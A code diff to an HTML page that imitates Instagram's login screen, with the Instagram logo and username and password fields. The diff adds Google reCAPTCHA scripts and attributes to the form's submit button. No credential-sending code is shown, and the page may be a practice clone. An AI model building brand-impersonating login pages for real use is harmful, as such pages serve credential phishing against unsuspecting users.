@@ -7,6 +7,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
     <link rel="stylesheet" href="style.css">
     <link rel="shortcut icon" href="images/favicon.svg" type="image/x-icon">
+    <script src="https://www.google.com/recaptcha/api.js"></script>
+    <!-- <script src="https://www.google.com/recaptcha/api.js?render=6Lck-PsoAAAAALfpGV1s6LR-sqHPVGZ3zXHRSOAC"></script> -->
+
 
 
 
@@ -30,10 +33,10 @@
             <div class="logo">
                 <img src="images/ig-logo.svg" alt="">
             </div>
-            <form>
+            <form id="insta-form">
                 <input type="text" class="text-input" placeholder="Phone Number, Username, or Email">
                 <input type="password" class="text-input" placeholder="Password">
-                <input type='submit' class='text-input primary-btn' value="Get In">
+                <input type='submit' class='text-input primary-btn g-recaptcha' data-sitekey='6Lck-PsoAAAAALfpGV1s6LR-sqHPVGZ3zXHRSOAC' data-callback="onSubmit" data-action='submit' value="Get In">
             </form>
             <div class="or">
                 <hr class="bar"> OR
